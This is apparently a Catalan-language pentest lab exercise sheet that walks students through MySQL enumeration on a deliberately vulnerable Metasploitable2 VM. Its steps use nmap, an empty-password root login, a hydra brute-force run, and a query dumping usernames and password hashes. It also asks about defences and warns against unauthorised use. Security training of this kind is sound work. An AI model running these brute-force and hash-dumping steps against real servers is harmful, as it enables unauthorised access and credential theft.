---
id: EX-08-11
title: "MySQL enumeration al Metasploitable"
status: draft
version: 1.0
created: 2026-08-07
updated: 2026-08-07
authors:
  - Bernat Mora
  - Hermes Agent
tags:
  - mysql
  - metasploitable2
  - nivell-mitja
prerequisites:
  - LAB-15-10
related:
  - LAB-15-10
  - LAB-15-11
estimated_time: 30 min
difficulty: beginner
---

# EX-08-11 - MySQL enumeration al Metasploitable

> Connectar al MySQL del Metasploitable2 amb credencials febles i enumerar les bases de dades.

## Que has de fer

1. Des del Kali, obre una terminal
2. Comprova el servei: `nmap -sV -p 3306 10.10.30.30`
3. Prova credencials buides: `mysql -h 10.10.30.30 -u root` (sense contrasenya)
4. Si funciona, fes `SHOW DATABASES;`
5. Prova altres usuaris comuns: `mysql -h 10.10.30.30 -u admin`
6. Prova amb hydra per trobar mes credencials: `hydra -L users.txt -P passwords.txt mysql://10.10.30.30 -t 4`
7. Un cop dins, enumera taules: `USE mysql; SHOW TABLES;`
8. Mira els usuaris: `SELECT User, Password FROM user;`

## Que has de buscar

- Quines bases de dades hi ha?
- Quins usuaris tens?
- Les contrasenyes son hash? (md5, sha1, etc.)
- Pots accedir a informacio sensible? (targetes de credit, etc.)
- Quines vulnerabilitats de MySQL has trobat?

## Preguntes per respondre

1. Has pogut entrar al MySQL? Amb quines credencials?
2. Quines bases de dades hi ha?
3. Com podem protegir el MySQL?

## Glossari

- **MySQL**: Sistema de gestio de bases de dades. Molt utilitzat pero tambe atacat.
- **credencials buides**: Quan pots entrar sense usuari/contrasenya. Vulnerabilitat critica!
- **SHOW DATABASES**: Comanda MySQL que llista totes les bases de dades del servidor.
- **hash**: Contrasenya xifrada. Pero molts son febles (md5, sha1).

## Validacio

Quan acabis, compara els teus resultats amb els del document [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md).

## Seguretat

**Recorda**: 
- Aquestes tecniques nomes sha d'utilitzar en entorns controlats (com aquest lab)
- Mai en sistemes reals sense permis
- Practicar sense permis es IL·LEGAL

## Referencies

- [LAB-15-10](../labs/lab-15-10-lab-real-muntat.md) - Lab real muntat al Kali
- [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md) - Nmap complet
- [EX-08-01](ex-08-01-nmap-metasploitable.md) - Nmap Metasploitable
- [EX-08-02](ex-08-02-sql-injection-dvwa.md) - SQL Injection DVWA
